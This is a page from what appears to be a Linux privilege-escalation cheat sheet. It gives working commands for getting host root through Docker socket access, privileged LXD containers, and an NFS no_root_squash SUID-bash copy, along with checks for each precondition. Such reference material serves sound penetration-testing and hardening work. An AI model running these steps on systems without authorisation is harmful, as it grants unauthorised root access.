# Groups, containers, and NFS

[← Linux quick reference](../03-linux-privesc.md)

Check matching socket, daemon mode, export, or mount; group name alone is insufficient.

```bash
id
groups
getent group docker
getent group lxd
ls -l /var/run/docker.sock /var/snap/lxd/common/lxd/unix.socket 2>/dev/null
docker version 2>/dev/null
lxc list 2>/dev/null
```

Rootful Docker socket accessible:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Accessible LXD daemon + suitable image:

```bash
lxc init alpine c -c security.privileged=true
lxc config device add c d disk source=/ path=/mnt
lxc start c
lxc exec c sh
```

Rootless Docker ≠ host root.

## NFS

```bash
cat /etc/exports 2>/dev/null
findmnt
showmount -e <NFS-SERVER>
```

`no_root_squash` + writable export + client root + compatible Bash binary:

```bash
mkdir /mnt/x
mount -o rw,vers=3 <NFS-SERVER>:/export /mnt/x
cp /bin/bash /mnt/x/rootbash
chmod +s /mnt/x/rootbash
```

```bash
/export/rootbash -p
```

## References

- [NFS exports](https://man7.org/linux/man-pages/man5/exports.5.html)
- [Docker daemon access](https://docs.docker.com/reference/cli/dockerd/)
